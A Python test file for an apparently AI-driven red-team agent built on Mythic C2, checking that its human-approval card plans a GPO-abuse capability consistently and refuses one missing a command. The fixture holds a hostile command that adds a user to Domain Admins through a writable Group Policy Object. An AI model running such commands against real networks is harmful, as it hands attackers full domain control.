"""The approval card plans a capability from the same inputs execute_capability accepts, string or dict."""

import json
import sys
from pathlib import Path
from types import SimpleNamespace

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "ai" / "langgraph"))

from ai.langgraph.model import Model  # noqa: E402
from mythic_tools import MythicTools  # noqa: E402

# The proposal from a live supervised run (2026-10-29, channel 4): `action` and `inputs` as JSON strings.
ACTION = {
    "capability": "gpo-controlled-system-exec",
    "gpo_guid": "{4B98578C-80BF-4765-8222-99085D0C5298}",
    "gpo_name": "STARKWALLPAPER",
    "domain": "north.sevenkingdoms.local",
    "callback_id": "1",
}
INPUTS = {
    "command": "cmd.exe",
    "command_arguments": '/c net group "Domain Admins" samwell.tarly /add /domain',
    "proof_host": "WINTERFELL",
    "gpo_acl_principal": "NORTH\\samwell.tarly",
    "gpo_acl_right": "WriteOwner",
}


def _plan(inputs) -> str:
    model = SimpleNamespace(mythic_client=MythicTools(agent_task_id="test"))
    return Model._capability_card_plan_text(model, {"action": json.dumps(ACTION), "inputs": inputs})


def test_string_inputs_plan_the_same_as_dict_inputs():
    from_string = _plan(json.dumps(INPUTS))
    from_dict = _plan(dict(INPUTS))

    assert "could not be built" not in from_string
    assert from_string.startswith("Planned inner tasks")
    assert from_string == from_dict


def test_missing_command_is_still_refused():
    inputs = {key: value for key, value in INPUTS.items() if key not in ("command", "command_arguments")}
    assert "could not be built" in _plan(json.dumps(inputs))
